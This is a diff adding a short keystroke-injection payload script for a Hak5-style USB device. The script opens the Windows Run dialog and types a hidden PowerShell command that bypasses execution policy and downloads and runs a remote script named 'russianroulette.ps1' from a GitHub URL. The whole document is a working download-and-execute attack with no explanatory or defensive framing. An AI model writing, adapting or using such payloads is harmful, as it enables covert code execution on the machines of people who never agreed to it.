@@ -1,0 +1,10 @@
+ATTACKMODE HID
+DELAY 2000
+GUI m
+DELAY 500
+GUI r
+DELAY 500
+DELETE
+DELAY 100
+STRING powershell -w h -NoP -NonI -Exec Bypass -Command "Start-Process powershell -ArgumentList '-NoP -NonI -Exec Bypass -w h -Command iex (iwr https://raw.githubusercontent.com/Thomas-Tubinas/Hak5/refs/heads/main/russianroulette.ps1?dl=1)' -WindowStyle Hidden"
+ENTER
